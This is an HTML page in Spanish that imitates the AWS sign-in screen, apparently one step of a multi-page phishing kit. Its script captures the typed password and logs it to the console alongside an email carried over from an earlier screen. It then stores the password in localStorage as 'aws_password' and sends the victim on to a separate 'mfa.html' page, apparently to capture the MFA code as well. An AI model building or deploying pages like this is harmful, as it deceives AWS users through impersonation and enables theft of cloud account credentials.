<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <title>AWS – Iniciar sesión</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
            margin: 0;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            overflow-x: hidden;
        }

        .aws-logo {
            margin-top: 70px;
            margin-bottom: 25px;
        }

        .aws-logo img {
            height: 60px;
        }

        .login-card {
            width: 430px;
            border: 1px solid #d1d5db;
            border-radius: 2px;
            padding: 25px 30px;
            background: #fff;
        }

        h1 {
            font-size: 18px;
            margin-bottom: 18px;
            font-weight: 600;
        }

        .email-label {
            font-size: 13px;
            margin-bottom: 8px;
        }

        .email-label span {
            color: #2563eb;
            cursor: pointer;
            font-size: 12px;
        }

        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 8px;
            font-size: 14px;
            border: 1px solid #9ca3af;
            border-radius: 2px;
            margin-bottom: 15px;
        }

        .checkbox-row {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            margin-bottom: 15px;
        }

        .forgot {
            margin-left: auto;
            font-size: 12px;
        }

        .forgot a {
            color: #2563eb;
            text-decoration: none;
        }

        button {
            width: 100%;
            padding: 9px;
            background: #f7981d;
            color: #111;
            border: none;
            border-radius: 2px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #dd850d;
        }

        /* Decoración inferior */
        .decor-bottom {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-between;
            pointer-events: none;
            padding: 0 40px;
        }

        .cube-group {
            display: flex;
            gap: 24px;
            align-items: flex-end;
        }

        .cube {
            border: 2px solid #d1d5f0;
            width: 80px;
            height: 80px;
            border-radius: 4px;
            position: relative;
        }

        .cube.small {
            width: 60px;
            height: 60px;
        }

        .cube.tall {
            height: 110px;
        }

        .cube::before,
        .cube::after {
            content: "";
            position: absolute;
            border: 1px solid #e5e7f5;
        }

        .cube::before {
            inset: 12px 6px auto 6px;
            height: 0;
            border-width: 1px 0 0 0;
        }

        .cube::after {
            inset: 6px auto 6px 50%;
            width: 0;
            border-width: 0 0 0 1px;
        }
    </style>
</head>

<body>

    <div class="aws-logo">
        <img src="aws-logo.png" alt="AWS">
    </div>

    <div class="login-card">
        <h1>Iniciar sesión</h1>

        <p class="email-label">
            Nombre de usuario: <br>
            <strong id="email-value"></strong> <span>(¿No es usted?)</span>
        </p>

        <label>Contraseña</label>
        <input type="password" id="password">

        <div class="checkbox-row">
            <input type="checkbox" id="show-pass">
            <label for="show-pass">Mostrar contraseña</label>

            <span class="forgot"><a href="#">¿Olvidó la contraseña?</a></span>
        </div>


        <button id="loginBtn" onclick="goMFA()">Iniciar sesión</button>


    </div>

    <!-- Decoración -->
    <div class="decor-bottom">
        <div class="cube-group">
            <div class="cube tall"></div>
            <div class="cube"></div>
            <div class="cube small"></div>
        </div>
        <div class="cube-group">
            <div class="cube small"></div>
            <div class="cube tall"></div>
            <div class="cube"></div>
        </div>
    </div>

    <script>
        // Obtener correo enviado de Pantalla 1
        const email = localStorage.getItem("aws_email");
        document.getElementById("email-value").textContent = email;

        // Mostrar/ocultar contraseña
        document.getElementById("show-pass").addEventListener("change", () => {
            const passField = document.getElementById("password");
            passField.type = passField.type === "password" ? "text" : "password";
        });

        // Definir goMFA EN EL ÁMBITO GLOBAL
        function goMFA() {
            window.location.href = "mfa.html";
        }

        // Imprimir contraseña y correo
        document.getElementById("loginBtn").addEventListener("click", () => {
            const password = document.getElementById("password").value;

            console.log("Usuario:", email);
            console.log("Contraseña:", password);

            // Guardar contraseña para MFA
            localStorage.setItem("aws_password", password);

            // Redirigir al MFA
            window.location.href = "mfa.html";
        });

    </script>


</body>

</html>
